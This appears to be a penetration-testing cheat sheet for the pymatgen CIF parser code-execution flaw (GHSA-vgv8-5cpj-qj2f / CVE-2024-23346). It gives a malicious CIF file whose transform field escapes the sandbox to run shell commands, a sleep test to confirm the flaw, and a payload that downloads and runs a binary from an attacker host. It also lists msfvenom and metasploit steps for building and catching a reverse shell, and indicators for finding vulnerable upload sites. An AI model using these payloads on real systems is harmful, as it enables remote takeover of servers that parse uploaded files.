# Pymatgen CIF Parser

Pymatgen is a Python library for materials analysis. Its CIF (Crystallographic Information File) parser is vulnerable to arbitrary code execution.

## GHSA-vgv8-5cpj-qj2f - Arbitrary Code Execution

**Vulnerable Code Pattern:**

```python
from pymatgen.io.cif import CifParser
# Parsing user-uploaded .cif files
```

**Indicators:**
- Web app accepting `.cif` file uploads
- Flask/Python app with CIF analysis features
- "Crystallographic Information File" mentioned

### Exploitation

**Malicious CIF File (RCE POC):**

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("id");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

**Verify with sleep:**

Replace the command with `sleep 10` and observe delay:

```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("sleep 10");0,0,0'
```

**Download and execute reverse shell:**

```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("curl http://ATTACKER:8000/shell.elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf");0,0,0'
```

### Attack Steps

```bash
# 1. Generate payload
msfvenom -p linux/x64/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=9001 -f elf -o shell.elf

# 2. Host payload
python3 -m http.server 8000

# 3. Start listener (use metasploit for staged payload)
msfconsole
use multi/handler
set payload linux/x64/shell/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 9001
run -j

# 4. Upload malicious .cif file to target app
# 5. Trigger parsing (usually by viewing the uploaded file)
```

### References

- https://github.com/advisories/GHSA-vgv8-5cpj-qj2f
- https://nvd.nist.gov/vuln/detail/CVE-2024-23346
